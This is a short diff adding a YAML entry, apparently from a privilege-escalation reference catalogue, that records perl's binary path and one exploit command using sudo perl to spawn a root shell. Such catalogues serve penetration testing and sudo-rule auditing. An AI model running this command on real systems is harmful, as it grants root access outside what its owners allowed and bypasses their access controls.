@@ -1,0 +1,4 @@
+name: perl
+binary_path: /usr/bin/perl
+exploit_cmds:
+- sudo /usr/bin/perl -e 'exec "/bin/sh"'
